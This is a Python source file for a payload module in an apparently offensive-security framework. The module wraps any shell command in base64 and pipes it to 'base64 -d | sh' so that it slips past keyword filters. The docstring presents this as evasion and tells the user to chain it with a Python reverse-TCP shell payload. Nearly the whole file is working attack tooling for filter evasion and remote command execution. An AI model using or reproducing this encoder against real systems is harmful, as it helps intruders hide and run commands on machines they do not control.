"""Base64-wrap a shell command for delivery through keyword filters.

Evasion 101: a filter looking for "python", "bash", "socket", or quotes in
your input sees only base64 alphabet. The shell decodes and executes on
the far side. Chain by hand for now:

    use payloads/python_reverse_tcp -> generate -> copy
    use payloads/encoders/base64_command, set PAYLOAD '<paste>' -> generate
"""

import base64

from core.module import PayloadModule
from core.options import OptString


def wrap_base64(command):
    """Wrap a shell command as `echo <b64> | base64 -d | sh`."""
    encoded = base64.b64encode(command.encode()).decode()
    return f"echo {encoded} | base64 -d | sh"


class Base64Command(PayloadModule):
    name = "Base64 Command Wrapper (sh)"
    description = """
        Wraps any shell command as echo <b64> | base64 -d | sh. Defeats
        naive keyword filters (no 'python', 'bash', quotes, or slashes in
        the output) and survives most copy/paste mangling. Detection note:
        a defender who sees base64 piped to sh knows exactly what you did.
    """
    authors = ["you"]

    def register_options(self):
        self.options.add(OptString("PAYLOAD", required=True,
                                   description="Shell command to wrap"))

    def generate(self):
        return wrap_base64(str(self.get_option("PAYLOAD")))
